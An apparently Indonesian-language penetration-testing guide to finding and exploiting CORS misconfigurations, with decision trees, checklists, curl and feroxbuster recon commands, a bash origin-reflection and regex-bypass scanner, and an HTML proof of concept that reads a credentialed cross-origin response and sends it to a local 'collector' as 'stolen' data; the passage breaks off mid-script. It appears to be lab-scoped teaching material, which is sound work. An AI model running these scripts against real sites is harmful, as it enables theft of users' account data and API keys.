Identify sensitive response
      ↓
Build PoC
      ↓
Serve PoC
      ↓
Verify browser can read response
      ↓
Document impact
```

---

# 🛰️ Burp Collaborator

Dalam lab yang mendukung OAST/Collaborator:

```text
Generate unique Collaborator interaction
        ↓
Place collaborator hostname in your controlled PoC
        ↓
Trigger browser interaction
        ↓
Observe HTTP/DNS interaction
```

Namun pahami perbedaannya:

```text
Collaborator callback
≠
CORS vulnerability automatically
```

Callback hanya menunjukkan outbound interaction.

CORS exploitation membutuhkan:

```text
browser can read sensitive cross-origin response
```

---

# 🔗 BAGIAN 4 — CORS + LAINNYA (CHAIN)

# 4.1 CORS + XSS 💣

Salah satu chain paling penting:

```text
XSS
 +
trusted subdomain
 +
CORS
 =
sensitive API access
```

---

## Scenario

```text
https://evil.example.com
```

mempunyai XSS.

API:

```text
https://api.example.com
```

percaya:

```text
*.example.com
```

Attack:

```text
XSS
 ↓
JavaScript runs on evil.example.com
 ↓
Origin trusted by api.example.com
 ↓
fetch(credentials: include)
 ↓
Sensitive response
```

---

## Step-by-Step

```text
1. Find trusted subdomain
2. Find XSS on that subdomain
3. Confirm exact origin
4. Send request to API with that origin
5. Check ACAO
6. Check ACAC
7. Identify sensitive endpoint
8. Build lab-only PoC
9. Verify browser response access
10. Document chain
```

---

# 4.2 CORS + CSRF 🔄

CORS dan CSRF berbeda.

## CSRF

Tujuan klasik:

```text
attacker
  ↓
membuat browser victim mengirim request
```

## CORS

Tujuan:

```text
attacker JavaScript
  ↓
membaca response cross-origin
```

---

## 🆚

|Attack|Fokus|
|---|---|
|CSRF|Membuat state-changing request|
|CORS|Membaca response cross-origin|
|SOP|Membatasi cross-origin script access|

---

## Kenapa CORS Fix Bisa Break CSRF Protection?

Misalnya API mengandalkan:

```text
Origin validation
```

atau flow preflight sebagai bagian desain aplikasi.

Perubahan CORS yang terlalu permisif dapat membuka cross-origin request surface yang sebelumnya dibatasi.

Namun:

```text
CORS ≠ CSRF token
```

Jangan menyimpulkan bahwa:

```text
"CORS secure = CSRF secure"
```

atau:

```text
"CORS vulnerable = CSRF automatically possible"
```

---

## Kapan CORS Misconfiguration Enable CSRF-like Attack?

Misalnya:

```text
attacker origin
       ↓
trusted by CORS
       ↓
credentials allowed
       ↓
state-changing API
       ↓
request succeeds
```

Jika response juga dapat dibaca:

```text
CORS + CSRF-like operation
```

impact lebih tinggi.

---

# 4.3 CORS + API Keys 🔑

API key dapat muncul dalam:

```json
{
  "api_key": "LAB_KEY"
}
```

atau:

```http
X-API-Key: ...
```

Jika sensitive endpoint bisa dibaca cross-origin:

```text
CORS
 ↓
read API response
 ↓
API key exposed
 ↓
use of key
 ↓
impact escalation
```

---

## Dampak

```text
Low:
information disclosure

Medium:
account data

High:
privileged API key

Critical:
key gives server/admin capabilities
```

Selalu lakukan impact analysis.

Jangan mengasumsikan:

```text
API key found
=
admin
```

---

# 🌳 BAGIAN 5 — DECISION TREE

```text
                         START
                           │
                           ▼
                  Find cross-origin API
                           │
                           ▼
                    Send Origin header
                           │
                           ▼
                 ACAO present?
                 ┌─────────┴─────────┐
                NO                  YES
                │                    │
                ▼                    ▼
        Browser likely       What value?
        blocks reading       ┌───────┼─────────────┐
                             │       │             │
                             ▼       ▼             ▼
                             *     reflected      null
                             │       │             │
                             │       │             │
                             │       ▼             ▼
                             │   ACAC=true?    ACAC=true?
                             │       │             │
                             │   ┌───┴───┐       ┌─┴─┐
                             │  NO      YES      NO  YES
                             │   │        │       │   │
                             │   ▼        ▼       │   ▼
                             │  Check   Browser    │  Test
                             │  public  blocks     │  null-origin
                             │  impact  wildcard   │
                             │          credential │
                             │                     │
                             ▼                     ▼
                         Public?              Sensitive?
                         ┌──┴──┐               ┌──┴──┐
                        YES   NO              NO   YES
                         │     │               │     │
                         ▼     ▼               ▼     ▼
                       Low/  Review         Low/   PoC
                     expected endpoint     review
                                             │
                                             ▼
                                     Trusted subdomain?
                                             │
                                  ┌──────────┴──────────┐
                                 NO                     YES
                                  │                      │
                                  ▼                      ▼
                              Direct PoC             XSS/host
                                                     leverage
                                                         │
                                                         ▼
                                                Sensitive response
                                                         │
                                                         ▼
                                                    Impact
```

---

# 🧯 BAGIAN 6 — COMMON ERRORS & TROUBLESHOOTING

|Error|Sebab|Solusi|
|---|---|---|
|1. `Access-Control-Allow-Origin` tidak ada|Server tidak mengizinkan origin|Coba endpoint/origin lain; validasi browser|
|2. `ACAO: *` tetapi fetch credentialed gagal|Wildcard tidak dapat dipakai untuk credentialed browser read|Uji apakah endpoint memang public; jangan menganggap exploitable|
|3. `ACAO` reflected tetapi response tidak terbaca|`ACAC` tidak aktif atau browser policy tidak cocok|Cek credentials mode dan response headers|
|4. `Origin: null` tidak bekerja|Endpoint tidak mempercayai null|Bandingkan dengan trusted/reflected origin|
|5. Preflight mendapat 403|Server menolak OPTIONS|Pastikan request memang membutuhkan preflight dan cek allow-method/header|
|6. Preflight sukses tetapi actual request gagal|Authorization/business logic menolak request|Bedakan CORS policy dari authentication/authorization|
|7. `curl` menunjukkan vulnerable tetapi browser tidak|curl tidak menegakkan SOP|Validasi dengan browser/actual fetch|
|8. Cookie tidak terkirim|Cookie attributes/policy tidak memungkinkan cross-site credentials|Periksa cookie scope dan browser policy|
|9. Response body kosong di JS|Browser memblokir response reading|Cek console dan CORS headers|
|10. Subdomain dianggap trusted tetapi exploit gagal|Subdomain tidak benar-benar attacker-controlled|Cari alternate subdomain/controlled lab host|
|11. Regex bypass tidak diterima|Regex sebenarnya anchored/structured validation|Uji hostname boundary dan exact origin parsing|
|12. `Origin: http://...` ditolak|Scheme divalidasi dengan benar|Bandingkan HTTP vs HTTPS hanya sebagai test case|
|13. Data sensitive tetapi endpoint public|Tidak ada credential requirement|Re-evaluate whether disclosure is actually security-relevant|
|14. PoC server terbuka tetapi fetch error|Mixed content/CORS/network issue|Lihat DevTools Console dan Network|
|15. Collector tidak menerima data|Browser gagal membaca response atau collector unreachable|Uji collector secara lokal terlebih dahulu|
|16. Collaborator tidak menerima callback|Request tidak pernah triggered|Pastikan PoC benar-benar dijalankan|
|17. Credentialed fetch ditolak|Server tidak mengirim `Access-Control-Allow-Credentials: true`|Confirm response policy|
|18. ACAO cocok tetapi header API key tidak terbaca|Header tidak exposed|Cek `Access-Control-Expose-Headers`|
|19. OPTIONS selalu 204 tetapi GET gagal|Preflight hanya lolos; authorization tetap gagal|Debug actual request|
|20. Scanner berkata vulnerable tetapi PoC gagal|False positive/context mismatch|Manual validation pada browser|

---

# 🏆 BAGIAN 7 — GOLDEN RULES

## 🥇 Rule 01

```text
CORS misconfiguration ≠ automatically exploitable
```

---

## 🥇 Rule 02

```text
ACAO: *
≠
credentialed data theft
```

---

## 🥇 Rule 03

```text
Reflection + credentials + sensitive response
= high-priority candidate
```

---

## 🥇 Rule 04

```text
curl ≠ browser
```

Gunakan:

```text
curl → inspect
Burp → manipulate
Browser → confirm
```

---

## 🥇 Rule 05

```text
Origin = scheme + host + port
```

Path bukan bagian origin.

---

## 🥇 Rule 06

```text
CORS ≠ authentication
CORS ≠ authorization
CORS ≠ CSRF protection
```

---

## 🥇 Rule 07

Jangan percaya:

```text
*.example.com
```

tanpa memeriksa apakah seluruh subdomain benar-benar trusted.

---

## 🥇 Rule 08

Jangan memvalidasi origin menggunakan:

```text
substring matching
```

Gunakan origin/hostname parsing yang benar.

---

## 🥇 Rule 09

```text
Detection
→ Browser confirmation
→ Impact validation
```

bukan:

```text
Scanner finding
→ report langsung
```

---

## 🥇 Rule 10

Selalu tanyakan:

```text
"Data apa yang sebenarnya bisa dicuri?"
```

---

# ✅ BAGIAN 8 — FINAL CHECKLIST

```text
[ ] 01. Target merupakan lab/authorized
[ ] 02. Origin target diketahui
[ ] 03. Target API endpoint ditemukan
[ ] 04. Sensitive endpoint ditemukan
[ ] 05. Request direkam di Burp
[ ] 06. Origin header diuji
[ ] 07. ACAO diperiksa
[ ] 08. ACAC diperiksa
[ ] 09. Allowed methods diperiksa
[ ] 10. Allowed headers diperiksa
[ ] 11. Exposed headers diperiksa
[ ] 12. Preflight diuji bila relevan
[ ] 13. Wildcard diuji
[ ] 14. Reflection diuji
[ ] 15. null diuji
[ ] 16. Trusted subdomain diuji
[ ] 17. Regex bypass candidates diuji
[ ] 18. Protocol mismatch diuji
[ ] 19. curl result dibandingkan dengan browser
[ ] 20. Credential requirement diketahui
[ ] 21. Cookie/session behavior diketahui
[ ] 22. Sensitive data identified
[ ] 23. Browser PoC dibuat
[ ] 24. PoC berjalan dari attacker-controlled lab origin
[ ] 25. Response benar-benar dapat dibaca JavaScript
[ ] 26. Data tidak sekadar terkirim; read access terbukti
[ ] 27. Impact dicatat
[ ] 28. Screenshot/HTTP evidence disimpan
[ ] 29. Request/response disimpan
[ ] 30. Semua testing dihentikan pada scope yang diizinkan
```

---

# 🔗 BAGIAN 9 — CROSS-WORKFLOW

## XSS

```text
XSS
 ↓
trusted subdomain
 ↓
CORS trust
 ↓
credentialed fetch
 ↓
sensitive API
```

---

## CSRF

```text
CSRF
 ↓
send state-changing request
```

CORS:

```text
CORS
 ↓
read cross-origin response
```

Keduanya dapat muncul dalam chain tetapi bukan vulnerability yang sama.

---

## Authentication

Cek:

```text
Is endpoint public?
Is session required?
Is token required?
Are credentials included?
Does authentication survive cross-origin request?
```

---

## API Security

Prioritaskan:

```text
/api/me
/api/profile
/api/account
/api/admin
/api/tokens
/api/keys
/api/internal
```

CORS impact sangat tergantung sensitivity API.

---

## OAuth

OAuth endpoint dapat melibatkan:

```text
Authorization endpoint
Callback
Access token
Refresh token
User info
API
```

CORS misconfiguration dapat memperburuk exposure apabila response yang mengandung sensitive OAuth/API data dapat dibaca cross-origin.

Namun jangan mencampurkan:

```text
CORS vulnerability
```

dengan:

```text
OAuth redirect vulnerability
```

keduanya memiliki root cause yang berbeda dan harus dianalisis terpisah.

---

# 🧠 CROSS-WORKFLOW MAP

```text
             ┌──────────────┐
             │     XSS      │
             └──────┬───────┘
                    │
                    ▼
             Trusted Origin
                    │
                    ▼
┌────────┐   ┌──────────────┐   ┌────────────┐
│ CSRF   │──▶│     CORS     │◀──│   OAuth    │
└────────┘   └──────┬───────┘   └────────────┘
                    │
                    ▼
              API Security
                    │
                    ▼
            Sensitive Endpoint
                    │
                    ▼
             Authentication
                    │
                    ▼
                  Impact
```

---

# ⚡ BAGIAN 10 — ONE-LINE MUSCLE MEMORY

## Wildcard

```text
Origin → ACAO:* → check public/sensitive → credentials? → browser behavior → impact
```

## Null Origin

```text
Origin:null → ACAO:null → ACAC:true? → sandbox iframe → browser confirmation → sensitive response
```

## Reflection

```text
Origin:evil → ACAO:evil → ACAC:true? → credentialed fetch → read response → impact
```

## Trusted Subdomain

```text
Untrusted subdomain → whitelist trust → XSS/control → credentialed fetch → sensitive API → impact
```

## Regex Bypass

```text
Known regex → mutate hostname → test Origin → reflected ACAO? → credentials? → browser PoC
```

## Protocol Mismatch

```text
HTTPS API → Origin:http://trusted → ACAO reflected → ACAC? → browser test → impact
```

## Universal CORS

```text
Find API → Add Origin → Read ACAO/ACAC → Classify → Browser-confirm → Sensitive data? → PoC → Impact
```

---

# 🧠 FINAL CORS MINDSET

Jangan berpikir:

```text
"Server mengembalikan ACAO, berarti vulnerable."
```

Gunakan model:

```text
                REQUEST
                   │
                   ▼
           attacker Origin
                   │
                   ▼
            Server validation
                   │
                   ▼
         ACAO / ACAC decision
                   │
                   ▼
          Browser CORS check
                   │
          ┌────────┴─────────┐
          ▼                  ▼
        ALLOW               BLOCK
          │
          ▼
   JavaScript reads data
          │
          ▼
   Is data sensitive?
       ┌──┴───┐
      NO     YES
       │       │
       ▼       ▼
     Low     IMPACT
```

---

# 🎯 MASTER FLOW

```text
RECON
  ↓
Find API
  ↓
Find sensitive endpoint
  ↓
Capture request in Burp
  ↓
Add Origin
  ↓
Inspect ACAO
  ↓
Inspect ACAC
  ↓
Inspect preflight if required
  ↓
Classify:
 ├── Wildcard
 ├── Reflection
 ├── Null
 ├── Trusted Subdomain
 ├── Regex Bypass
 └── Protocol Mismatch
  ↓
Check authentication
  ↓
Check credentials
  ↓
Check sensitive data
  ↓
Browser PoC
  ↓
Confirm response readability
  ↓
Document impact
```

---

# 🧩 THE MOST IMPORTANT DISTINCTION

```text
                    ACAO: *
                       │
             ┌─────────┴─────────┐
             │                   │
          Public             Sensitive
             │                   │
             ▼                   ▼
        Often okay         Need deeper test
                                 │
                                 ▼
                         Credentialed request?
                                 │
                        ┌────────┴─────────┐
                       NO                 YES
                        │                   │
                        ▼                   ▼
                  Review impact       Wildcard fails
                                      for credentialed
                                      browser read


                 ORIGIN REFLECTION
                         │
                         ▼
             ACAO mirrors attacker
                         │
                         ▼
                     ACAC:true?
                         │
                    ┌────┴────┐
                   NO        YES
                   │           │
                   ▼           ▼
              Limited       High-value
              impact         candidate
                               │
                               ▼
                         Sensitive API?
                               │
                               ▼
                             PoC
```

> **Muscle memory utama:**  
> `Origin → ACAO → ACAC → Credentials → Browser → Sensitive Response → Impact`


---

# [33 — CORS Workflow 🌐](/docs/cors) — CORS Complete Attack Workflow

> **Cara baca:** Setiap langkah punya **OUTPUT BERHASIL** ✅ dan **OUTPUT GAGAL/BERBEDA** ❌. Ikuti panah sesuai output yang kamu dapat.

---

## 🔧 PRE-FLIGHT: Setup Environment

Bash

```
# Jalankan INI DULU sebelum apapun
export TARGET="https://lab.example"
export TARGET_API="https://api.example.com"
export LHOST="127.0.0.1"        # IP attacker server (lokal untuk lab)
export EVIL_ORIGIN="https://evil.example"

mkdir -p ~/cors_loot/{requests,responses,poc,evidence}
cd ~/cors_loot

echo "[*] Target: $TARGET_API | Evil Origin: $EVIL_ORIGIN"
```

**Output yang diharapkan:**

text

```
[*] Target: https://api.example.com | Evil Origin: https://evil.example
```

---

## ═══════════════════════════════════════

## FASE 0: RECON — TEMUKAN API & ENDPOINT SENSITIF

## ═══════════════════════════════════════

### Langkah 0.1 — Spider & Intercept Traffic di Burp

Bash

```
# Method 1: Buka Burp → Proxy → Intercept ON
# Browsing aplikasi secara manual, perhatikan request ke /api/*

# Method 2: Spider dengan feroxbuster (cari endpoint API)
feroxbuster -u $TARGET \
    -w /usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt \
    -x json,php \
    --filter-status 404,403 \
    -o ~/cors_loot/api_endpoints.txt

# Method 3: Cari di JS files (sering ada endpoint tersembunyi)
curl -s $TARGET | grep -oP '(?<=src=")[^"]+\.js' | while read jsfile; do
    curl -s "$TARGET/$jsfile" | grep -oP '/api/[a-zA-Z0-9/_-]+'
done | sort -u | tee ~/cors_loot/js_endpoints.txt
```

**OUTPUT BERHASIL ✅ — Endpoint ditemukan:**

text

```
/api/account
/api/profile
/api/me
/api/admin/users
/api/tokens
/api/orders
```

➡️ **Prioritas tinggi untuk CORS test:**

|Endpoint|Kenapa Sensitif|
|---|---|
|`/api/account`|Data user, email, role|
|`/api/me`|Session info|
|`/api/admin`|Admin data|
|`/api/tokens`|API keys, OAuth tokens|
|`/api/orders`|Data finansial|
|`/graphql`|Bisa expose banyak data|

**OUTPUT GAGAL ❌ — Tidak ada endpoint:**

text

```
[No results found]
```

➡️ Coba:

Bash

```
# Wordlist lebih besar
feroxbuster -u $TARGET \
    -w /usr/share/seclists/Discovery/Web-Content/raft-large-words.txt \
    --filter-status 404

# Atau cari di source HTML
curl -s $TARGET | grep -oP 'fetch\(['"'"'"][^'"'"'"]+['"'"'"]' | sort -u
curl -s $TARGET | grep -oP 'axios\.[a-z]+\(['"'"'"][^'"'"'"]+' | sort -u
```

---

### Langkah 0.2 — Identifikasi Endpoint Bertarget

Bash

```
# Test satu endpoint, lihat apa yang dikembalikan
curl -s "$TARGET_API/api/account" -H "Cookie: session=TEST" | python3 -m json.tool

# Cek apakah butuh authentication
curl -v "$TARGET_API/api/account" 2>&1 | grep "HTTP/"
```

**OUTPUT BERHASIL ✅ — Data sensitif tanpa auth (atau dengan auth):**

JSON

```
{
    "username": "alice",
    "email": "alice@example.test",
    "role": "admin",
    "api_key": "sk-1234..."
}
```

➡️ Endpoint ini **high value target** untuk CORS test. Lanjut ke **Fase 1**.

**OUTPUT BERHASIL ✅ — 401/403 (butuh auth):**

text

```
HTTP/2 401
{"error": "Unauthorized"}
```

➡️ Login dulu via browser, capture session cookie dari Burp, lalu:

Bash

```
export SESSION="session=CAPTURED_SESSION_VALUE"
# Lanjut ke Fase 1 dengan cookie ini
```

**OUTPUT GAGAL ❌ — 404:**

text

```
HTTP/2 404
```

➡️ Endpoint salah. Balik ke Langkah 0.1, coba endpoint lain.

---

## ═══════════════════════════════════════

## FASE 1: CORS HEADER DETECTION

## ═══════════════════════════════════════

> **Tujuan:** Deteksi apakah server memberikan CORS headers dan bagaimana pola responsnya.

### Langkah 1.1 — Test Baseline (Tanpa Origin Header)

Bash

```
# Command 1: Request normal tanpa Origin — lihat default response
curl -i "$TARGET_API/api/account" \
    -H "$SESSION"

# Simpan response untuk perbandingan
curl -si "$TARGET_API/api/account" \
    -H "$SESSION" > ~/cors_loot/responses/baseline.txt

cat ~/cors_loot/responses/baseline.txt | grep -i "access-control"
```

**OUTPUT BERHASIL ✅ — Ada CORS header di response normal:**

text

```
Access-Control-Allow-Origin: https://app.example.com
Access-Control-Allow-Credentials: true
```

➡️ Server sudah punya CORS config. Catat nilai ini. Lanjut ke **Langkah 1.2**.

**OUTPUT — Tidak ada CORS header (normal):**

text

```
HTTP/2 200
Content-Type: application/json
[tidak ada Access-Control header]
```

➡️ Normal — browser enforce CORS, bukan server. Lanjut ke Langkah 1.2 untuk test behavior saat Origin dikirim.

---

### Langkah 1.2 — Test dengan Evil Origin (Detection Utama)

Bash

```
# Command 1: Kirim evil origin — apakah direflect?
curl -si "$TARGET_API/api/account" \
    -H "Origin: https://evil.example" \
    -H "$SESSION" | grep -i "access-control"

# Command 2: Kirim origin kedua — konfirmasi reflection pattern
curl -si "$TARGET_API/api/account" \
    -H "Origin: https://attacker.example" \
    -H "$SESSION" | grep -i "access-control"

# Command 3: Test null origin
curl -si "$TARGET_API/api/account" \
    -H "Origin: null" \
    -H "$SESSION" | grep -i "access-control"

# Command 4: Jalankan detection script lengkap (dari file)
cat > /tmp/cors_check.sh << 'SCRIPT'
#!/usr/bin/env bash
set -u
TARGET="${1}"
SESSION="${2:-}"
ORIGINS=(
    "https://evil.example"
    "null"
    "https://evil.example.com"
    "https://example.com.evil.example"
    "https://evilexample.com"
    "http://example.com"
    "https://evil.app.example.com"
)
echo "=== CORS CHECK ==="
echo "Target: $TARGET"
echo
for ORIGIN in "${ORIGINS[@]}"; do
    echo "--- Origin: $ORIGIN ---"
    RESPONSE="$(curl -sS -i \
        -H "Origin: $ORIGIN" \
        ${SESSION:+-H "$SESSION"} \
        "$TARGET")"
    ACAO="$(printf '%s\n' "$RESPONSE" | grep -i '^Access-Control-Allow-Origin:' | tail -n1 | tr -d '\r')"
    ACAC="$(printf '%s\n' "$RESPONSE" | grep -i '^Access-Control-Allow-Credentials:' | tail -n1 | tr -d '\r')"
    [ -n "$ACAO" ] && echo "$ACAO" || echo "ACAO: <not present>"
    [ -n "$ACAC" ] && echo "$ACAC" || echo "ACAC: <not present>"
    if printf '%s\n' "$ACAO" | grep -qi "$ORIGIN"; then
        if printf '%s\n' "$ACAC" | grep -qi "true"; then
            echo "[!!] POTENTIALLY VULNERABLE: reflected + credentials"
        else
            echo "[?] Origin reflected (no credentials)"
        fi
    elif printf '%s\n' "$ACAO" | grep -q '\*'; then
        echo "[?] Wildcard detected"
    fi
    echo
done
SCRIPT
chmod +x /tmp/cors_check.sh
/tmp/cors_check.sh "$TARGET_API/api/account" "$SESSION"
```

**OUTPUT BERHASIL ✅ — CASE A: Origin Reflection + Credentials (HIGH SEVERITY):**

text

```
--- Origin: https://evil.example ---
Access-Control-Allow-Origin: https://evil.example
Access-Control-Allow-Credentials: true
[!!] POTENTIALLY VULNERABLE: reflected + credentials
```

➡️ **JACKPOT!** Lanjut ke **Fase 3A — Exploit Reflection**.

**OUTPUT BERHASIL ✅ — CASE B: Wildcard:**

text

```
--- Origin: https://evil.example ---
Access-Control-Allow-Origin: *
ACAC: <not present>
[?] Wildcard detected
```

➡️ Wildcard tanpa credentials = tidak langsung exploitable untuk data theft berbasis cookie. Lanjut ke **Fase 2** untuk analisis lebih dalam.

**OUTPUT BERHASIL ✅ — CASE C: Null Origin Accepted:**

text

```
--- Origin: null ---
Access-Control-Allow-Origin: null
Access-Control-Allow-Credentials: true
[!!] POTENTIALLY VULNERABLE: reflected + credentials
```

➡️ Lanjut ke **Fase 3B — Exploit Null Origin**.

**OUTPUT BERBEDA ✅ — CASE D: Trusted Subdomain:**

text

```
--- Origin: https://evil.example.com ---
Access-Control-Allow-Origin: https://evil.example.com
Access-Control-Allow-Credentials: true
[!!] POTENTIALLY VULNERABLE: reflected + credentials
```

➡️ Lanjut ke **Fase 3C — Trusted Subdomain Abuse**.

**OUTPUT GAGAL ❌ — Semua origin ditolak:**

text

```
--- Origin: https://evil.example ---
ACAO: <not present>
ACAC: <not present>
```

➡️ Coba bypass lanjutan di **Langkah 1.3**.

---

### Langkah 1.3 — Regex Bypass Testing

Bash

```
# Misal trusted origin adalah: https://example.com
# Coba semua variasi bypass

TRUSTED="example.com"

# Kirim semua kandidat bypass
BYPASS_ORIGINS=(
    "https://${TRUSTED}.evil.com"          # suffix bypass
    "https://evil${TRUSTED}"               # prefix bypass
    "https://evil.${TRUSTED}"              # subdomain
    "http://${TRUSTED}"                    # protocol downgrade
    "https://${TRUSTED}:8443"              # different port
    "https://${TRUSTED}%60.evil.com"       # URL encode bypass
    "https://${TRUSTED}_.evil.com"         # underscore
)

for origin in "${BYPASS_ORIGINS[@]}"; do
    result=$(curl -si "$TARGET_API/api/account" \
        -H "Origin: $origin" \
        -H "$SESSION" | grep -i "access-control-allow-origin")
    echo "Origin: $origin"
    echo "Response: $result"
    echo "---"
done
```

**OUTPUT BERHASIL ✅ — Suffix bypass berhasil:**

text

```
Origin: https://example.com.evil.com
Response: Access-Control-Allow-Origin: https://example.com.evil.com
```

➡️ Regex lemah! Server hanya cek `contains("example.com")`. Lanjut ke **Fase 3A**.

**OUTPUT BERHASIL ✅ — Prefix bypass berhasil:**

text

```
Origin: https://evilexample.com
Response: Access-Control-Allow-Origin: https://evilexample.com
```

➡️ Lanjut ke **Fase 3A**, gunakan origin `https://evilexample.com`.

**OUTPUT GAGAL ❌ — Semua bypass gagal:**

text

```
[semua mengembalikan ACAO: tidak ada]
```

➡️ CORS terkonfigurasi dengan baik untuk endpoint ini. Coba endpoint lain atau lanjut ke **Fase 4 (Automated Tools)**.

---

### Langkah 1.4 — Preflight Test (OPTIONS)

Bash

```
# Test preflight untuk endpoint yang butuh DELETE/PUT
curl -si "$TARGET_API/api/account" \
    -X OPTIONS \
    -H "Origin: https://evil.example" \
    -H "Access-Control-Request-Method: DELETE" \
    -H "Access-Control-Request-Headers: Authorization, Content-Type"
```

**OUTPUT BERHASIL ✅ — Preflight diizinkan:**

text

```
HTTP/2 204
Access-Control-Allow-Origin: https://evil.example
Access-Control-Allow-Methods: GET, POST, DELETE
Access-Control-Allow-Headers: Authorization, Content-Type
Access-Control-Allow-Credentials: true
```

➡️ Server mengizinkan method berbahaya (DELETE) dari evil origin. Catat ini.

**OUTPUT GAGAL ❌ — Preflight 403:**

text

```
HTTP/2 403
```

➡️ Preflight diblokir. Tapi ingat: server tetap menerima actual request! Cek apakah ini simple request yang tidak butuh preflight.

---

## ═══════════════════════════════════════

## FASE 2: ANALISIS & KLASIFIKASI

## ═══════════════════════════════════════

### Langkah 2.1 — Klasifikasi Temuan

Setelah Fase 1, isi tabel ini:

Bash

```
# Buat file summary
cat > ~/cors_loot/cors_summary.txt << 'EOF'
=== CORS ANALYSIS SUMMARY ===

Target Endpoint: [ISI]
Sensitive Data: [ISI: ya/tidak, apa saja]
Auth Required: [ISI: ya/tidak]

CORS Behavior:
- Evil origin reflected: [ya/tidak]
- Null origin accepted: [ya/tidak]
- Wildcard used: [ya/tidak]
- ACAC: true: [ya/tidak]
- Trusted subdomain trusted: [ya/tidak]
- Regex bypass possible: [ya/tidak]
- Protocol mismatch: [ya/tidak]

VERDICT: [HIGH/MEDIUM/LOW/INFORMATIONAL]
EOF
```

**Panduan verdict:**

|Kondisi|Verdict|
|---|---|
|Reflection + ACAC:true + sensitive data|**HIGH**|
|Null + ACAC:true + sensitive data|**HIGH**|
|Trusted subdomain + sensitive data|**HIGH** → butuh XSS di subdomain|
|Wildcard + public data only|**LOW/INFO**|
|Wildcard + sensitive data + no credentials|**MEDIUM**|
|Regex bypass + ACAC:true|**HIGH**|

---

### Langkah 2.2 — Verifikasi Sensitive Data

Bash

```
# Lihat isi response dengan cookie valid
curl -s "$TARGET_API/api/account" \
    -H "Origin: https://evil.example" \
    -H "$SESSION" | python3 -m json.tool

# Cari field sensitif
curl -s "$TARGET_API/api/account" \
    -H "Origin: https://evil.example" \
    -H "$SESSION" | python3 -c "
import sys, json
data = json.load(sys.stdin)
sensitive = ['email','role','api_key','token','password','admin','secret','key']
print('=== SENSITIVE FIELDS ===')
for key, val in data.items():
    if any(s in key.lower() for s in sensitive):
        print(f'[!!] {key}: {val}')
"
```

**OUTPUT BERHASIL ✅ — Data sensitif ditemukan:**

text

```
=== SENSITIVE FIELDS ===
[!!] email: alice@example.test
[!!] role: admin
[!!] api_key: sk-prod-abc123...
```

➡️ Sangat valuable. Lanjut ke **Fase 3** untuk buat PoC.

---

## ═══════════════════════════════════════

## FASE 3: EXPLOITATION — PROOF OF CONCEPT

## ═══════════════════════════════════════

> **PENTING:** Semua PoC hanya untuk lab/authorized target. Ganti URL dengan target lab kamu.

### Langkah 3.0 — Setup Attack Server

Bash

```
# Terminal 1: PoC Server (host HTML exploit)
mkdir -p ~/cors_loot/poc
cd ~/cors_loot/poc
python3 -m http.server 8000

# Terminal 2: Collector (terima stolen data)
mkdir -p ~/cors_loot/collector
cd ~/cors_loot/collector
python3 -m http.server 9001

echo "[*] PoC Server: http://127.0.0.1:8000"
echo "[*] Collector:  http://127.0.0.1:9001"
```

**OUTPUT BERHASIL ✅:**

text

```
Serving HTTP on 0.0.0.0 port 8000 ...
Serving HTTP on 0.0.0.0 port 9001 ...
```

---

### PATH A — Exploit: Origin Reflection + Credentials

> Prasyarat: Fase 1 menunjukkan evil origin direflect + ACAC:true

Bash

```
# Buat PoC HTML
cat > ~/cors_loot/poc/cors_reflection.html << 'EXPLOIT'
<!doctype html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <title>CORS PoC - Reflection</title>
</head>
<body>
<h1>CORS Lab — Origin Reflection</h1>
<pre id="output">Menunggu response...</pre>

<script>
(async () => {
    const output = document.getElementById("output");
    
    // GANTI: URL target lab kamu
    const target = "https://lab.example/api/account";
    
    // Collector lokal kamu
    const collector = "http://127.0.0.1:9001/";

    output.textContent = "[*] Mengirim credentialed fetch...";

    try {
        const response = await fetch(target, {
            method: "GET",
            credentials: "include"   // Kirim cookies!
        });

        const text = await response.text();
        output.textContent = "[+] BERHASIL! Data:\n" + text;

        // Kirim ke collector
        const beacon = collector + "?stolen=" + encodeURIComponent(text);
        await fetch(beacon, {
            method: "GET",
            mode: "no-cors"
        });

        output.textContent += "\n\n[*] Data dikirim ke collector.";

    } catch (error) {
        output.textContent = "[-] Error: " + error + 
            "\n[*] CORS policy memblokir atau endpoint tidak ada.";
    }
})();
</script>
</body>
</html>
EXPLOIT

echo "[*] PoC dibuat: ~/cors_loot/poc/cors_reflection.html"
echo "[*] Buka di browser: http://127.0.0.1:8000/cors_reflection.html"
```

**OUTPUT BERHASIL ✅ — Browser menampilkan data:**

text

```
[+] BERHASIL! Data:
{"username":"alice","email":"alice@example.test","role":"admin","api_key":"sk-prod-abc123"}

[*] Data dikirim ke collector.
```

➡️ Di terminal collector:

text

```
127.0.0.1 - - [GET /?stolen=%7B%22username%22%3A%22alice%22...] 200
```

➡️ **CORS Vulnerability CONFIRMED!** Simpan evidence:

Bash

```
# Screenshot browser
# Simpan request/response dari Burp
# Decode stolen data
python3 -c "import urllib.parse; print(urllib.parse.unquote('STOLEN_ENCODED_DATA'))"
```

**OUTPUT GAGAL ❌ — Browser console error:**

text

```
Access to fetch at 'https://lab.example/api/account' from origin
'http://127.0.0.1:8000' has been blocked by CORS policy
```

➡️ Artinya:

1. Server tidak mereflect origin `http://127.0.0.1:8000`
2. Kamu harus serve PoC dari origin yang direflect server

Bash

```
# Cek: origin mana yang diterima server?
# Dari hasil Fase 1, gunakan origin yang diterima
# Contoh: jika evil.example diterima, kamu perlu host di evil.example
# Untuk lab lokal, edit /etc/hosts:
echo "127.0.0.1 evil.example" | sudo tee -a /etc/hosts

# Lalu serve dari port 80 (butuh sudo) atau edit URL di PoC
# Atau gunakan Burp Collaborator jika tersedia
```

**OUTPUT GAGAL ❌ — Output kosong / "undefined":**

text

```
[+] BERHASIL! Data:
undefined
```

➡️ Response mungkin bukan JSON, atau endpoint tidak return data. Coba:

JavaScript

```
// Ganti di PoC:
const text = await response.text();
// atau
const text = JSON.stringify(await response.json(), null, 2);
// tambahkan juga:
console.log("Status:", response.status);
console.log("Headers:", [...response.headers.entries()]);
```

---

### PATH B — Exploit: Null Origin

> Prasyarat: Fase 1 menunjukkan `Origin: null` diterima server + ACAC:true

Bash

```
cat > ~/cors_loot/poc/cors_null.html << 'EXPLOIT'
<!doctype html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <title>CORS PoC - Null Origin</title>
</head>
<body>
<h1>CORS Lab — Null Origin</h1>
<pre id="output">Menunggu...</pre>

<script>
window.addEventListener("message", (event) => {
    const output = document.getElementById("output");
    if (event.data && event.data.ok) {
